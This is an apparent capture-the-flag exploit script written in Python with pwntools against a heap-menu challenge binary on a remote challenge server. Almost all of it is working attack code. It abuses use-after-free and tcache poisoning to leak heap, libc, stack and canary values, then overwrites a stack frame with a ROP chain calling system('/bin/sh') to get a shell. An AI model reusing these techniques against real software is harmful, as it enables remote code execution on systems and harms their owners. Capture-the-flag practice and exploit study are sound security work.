from pwn import *
import subprocess
import os
import sys
sys.path.append("../CTF_setup/Utils")
from utils import *
from file_struct import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

final = 1

enc = lambda a: a.encode() if isinstance(a, str) else a
sla = lambda a, b: io.sendlineafter(enc(a), enc(b))
snl = lambda a: io.sendline(enc(a))
sna = lambda a, b: io.sendafter(enc(a), enc(b))
snd = lambda a: io.send(enc(a))
rcu = lambda a: io.recvuntil(enc(a), drop=True)
rcv = lambda a: io.recv(enc(a))
rcl = lambda: io.recvline()
p24 = lambda a: p32(a)[:-1]
l64 = lambda a: u64(a.ljust(8, b"\x00"))
l32 = lambda a: u64(a.ljust(4, b"\x00"))
l16 = lambda a: u64(a.ljust(2, b"\x00"))
sen = lambda a: str(a).encode()
mangle = lambda ptr, pos: ptr ^ (pos >> 12)

def debug():
    pid = io.proc.pid
    subprocess.run(["gnome-terminal", "--", "zsh", "-c", "gdb -nx -x ../CTF_setup/Utils/custom_gdb.py -x g -p " + str(pid)])

if final == 1:
    io = remote("chall.0xfun.org", 49332)
else:
    io = process("./chall_patched", aslr=True)



''' let's pwn '''
'''full protection partout'''
def create(i, s, d):
    sla(b"Exit", b"1")
    sla(b"Index", i)
    sla(b"Size", s)
    sla(b"Data", d)

def delete(i):
    sla(b"Exit", b"2")
    sla(b"Index", i)

def read(i):
    sla(b"Exit", b"3")
    sla(b"Index", i)

def edit(i, d):
    sla(b"Exit", b"4")
    sla(b"Index", i)
    sla(b"Data", d)


create(b"0", b"6", b"a")
create(b"1", b"16", b"a")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle
print("first heap leak : ", real_heap)

new_heap = (real_heap + 0x10) ^ leak_mangle
create(b"2", b"32", b"A")
edit(b"0", p64(new_heap)[:-2])
create(b"0", b"16", b"a")
create(b"0", b"16", p64(0) + p64(0x431))

for i in range(14):
    print(i)
    create(b"0", b"48", b"A")

create(b"0", b"48", b"A")
create(b"1", b"48", b"A")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle

new_heap = (real_heap - 0x10) ^ leak_mangle
create(b"3", b"32", b"A")
edit(b"0", p64(new_heap))
create(b"0", b"48", b"a")
create(b"0", b"48", p64(0) + p64(0x431))

for i in range(12):
    print(i)
    create(b"0", b"64", b"A")

delete(b"2")
read(b"2")
rcu(b"Data: ")
leak_libc = l64(rcv(6))
print("libc leak : ", hex(leak_libc))

libc_base = leak_libc - (0x7ffff7fb1b20 - 0x00007ffff7dc7000)
binsh     = libc_base + (0x7ffff7f79ea4 - 0x00007ffff7dc7000)
syst      = libc_base + (0x7ffff7e1dac0 - 0x00007ffff7dc7000)
stdin     = libc_base + (0x7ffff7fb18e0 -  0x00007ffff7dc7000)
stdout    = libc_base + (0x7ffff7fb25c0 -  0x00007ffff7dc7000)
stder     = libc_base + (0x7ffff7fb24e0 -  0x00007ffff7dc7000)
''' pas de hook tfacon ... '''
mall_hook = libc_base + (0x7ffff7fb81c0 -  0x00007ffff7dc7000)
free_hook = libc_base + (0x7ffff7fb81c8 -  0x00007ffff7dc7000)
og1 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0xe5ff0
og2 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0x10472a
og3 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0x104732
og4 = libc_base + (0x00007ffff7dca000 -  0x00007ffff7dc7000) + 0x104737
pop_rdi = libc_base + (0x7f729daf3dea - 0x00007f729d9ee000)

'''ça vire au fsop'''
'''go se foutre sur stdout'''
'''ptn g la flemme'''
'''hehe ptet pas en fait'''

create(b"0", str(0x100).encode(), b"A")
create(b"1", str(0x100).encode(), b"B")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle

new_heap = (stdout + 0x110) ^ leak_mangle
edit(b"0", p64(new_heap))
create(b"0", str(0x100).encode(), b"a")
create(b"1", str(0x100).encode(), b"a")
read(b"1")
rcu(b"Data: a\n" + b"\x00"*14)
leak_stack = l64(rcv(6))
print("leak stack : ", hex(leak_stack))



create(b"0", str(0x60).encode(), b"A")
create(b"1", str(0x60).encode(), b"B")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle
main_base_stack_frame = leak_stack - (0x7ffd556b26f8 - 0x7ffd556b2650)
new_heap = main_base_stack_frame ^ leak_mangle
edit(b"0", p64(new_heap))
create(b"0", str(0x60).encode(), b"b")
create(b"1", str(0x60).encode(), b"c")
read(b"1")
rcu(b"Data: c\n" + b"\x00"*14)
rcv(8)
canary = l64(rcv(8))
print("leak canary : ", hex(canary))


create(b"0", str(0x70).encode(), b"A")
create(b"1", str(0x70).encode(), b"B")
delete(b"1")
read(b"1")
rcu(b"Data: ")
leak_mangle = l64(rcv(5))
delete(b"0")
read(b"0")
rcu(b"Data: ")
leak_heap = l64(rcv(6))
real_heap = leak_heap ^ leak_mangle
create_note_base_stack_frame = leak_stack - (0x7ffca5aa9618 - 0x7ffca5aa94d0)
new_heap = create_note_base_stack_frame ^ leak_mangle
edit(b"0", p64(new_heap))
create(b"0", str(0x70).encode(), b"b")


create(b"1", str(0x70).encode(), b"c"*8 + p64(pop_rdi+1) + p64(pop_rdi) + p64(binsh) + p64(syst))


''' end '''
if not final:
    debug()
io.interactive()


